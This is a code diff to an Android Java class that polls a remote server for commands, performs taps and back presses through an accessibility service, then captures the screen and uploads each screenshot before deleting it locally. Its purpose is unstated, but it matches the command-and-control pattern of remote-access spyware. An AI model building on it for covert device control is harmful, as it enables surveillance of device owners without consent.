@@ -23,6 +23,7 @@ public class HttpPollingEngine implements Runnable {
         this.context = context.getApplicationContext();
         this.httpClient = new OkHttpClient.Builder()
                 .connectTimeout(10, TimeUnit.SECONDS)
+                .readTimeout(15, TimeUnit.SECONDS)
                 .build();
     }
 
@@ -37,15 +38,15 @@ public class HttpPollingEngine implements Runnable {
                     if (response.isSuccessful()) {
                         String body = response.body().string();
                         if (!body.equals("wait")) {
-                            Log.d(TAG, "Выполнение: " + body);
+                            Log.d(TAG, "Получена команда: " + body);
                             handleCommand(new JSONObject(body));
-                            sendAck(); // Сообщаем серверу, что команда принята
+                            sendAck(); // Сразу удаляем команду с сервера
                         }
                     }
                 }
                 Thread.sleep(1000);
             } catch (Exception e) {
-                Log.e(TAG, "Ошибка: " + e.getMessage());
+                Log.e(TAG, "Polling error: " + e.getMessage());
                 try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
             }
         }
@@ -54,7 +55,10 @@ public class HttpPollingEngine implements Runnable {
     private void handleCommand(JSONObject json) {
         try {
             MyAccessibilityService service = MyAccessibilityService.getInstance();
-            if (service == null) return;
+            if (service == null) {
+                Log.e(TAG, "A11yService не запущен!");
+                return;
+            }
 
             String action = json.getString("a");
             if (action.equals("tap")) {
@@ -65,18 +69,17 @@ public class HttpPollingEngine implements Runnable {
                 service.pressBack();
             }
 
-            // ВАЖНО: Запрашиваем скриншот СРАЗУ после действия
+            // Мгновенный запрос скриншота после любого действия
             Intent intent = new Intent(context, ScreenCaptureRequestActivity.class);
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             context.startActivity(intent);
 
         } catch (Exception e) {
-            Log.e(TAG, "handleCommand Error: " + e.getMessage());
+            Log.e(TAG, "Command error: " + e.getMessage());
         }
     }
 
     private void sendAck() {
-        // Эндпоинт /ack должен быть добавлен в Config.java
         Request req = new Request.Builder().url(Config.BASE_URL + "/ack").get().build();
         try (Response res = httpClient.newCall(req).execute()) {
             Log.d(TAG, "ACK sent: " + res.code());
@@ -85,12 +88,13 @@ public class HttpPollingEngine implements Runnable {
 
     public void uploadScreenshot(File file) {
         if (file == null || !file.exists()) return;
+        // Отправляем как Binary Body (не Multipart), так как сервер ждет чистый файл
         RequestBody body = RequestBody.create(file, MediaType.parse("image/jpeg"));
         Request req = new Request.Builder().url(Config.ENDPOINT_UPLOAD).post(body).build();
         try (Response resp = httpClient.newCall(req).execute()) {
-            Log.i(TAG, "Скриншот загружен: " + resp.code());
+            Log.i(TAG, "Screenshot uploaded: " + resp.code());
         } catch (IOException e) {
-            Log.e(TAG, "Ошибка загрузки: " + e.getMessage());
+            Log.e(TAG, "Upload error: " + e.getMessage());
         } finally {
             file.delete();
         }
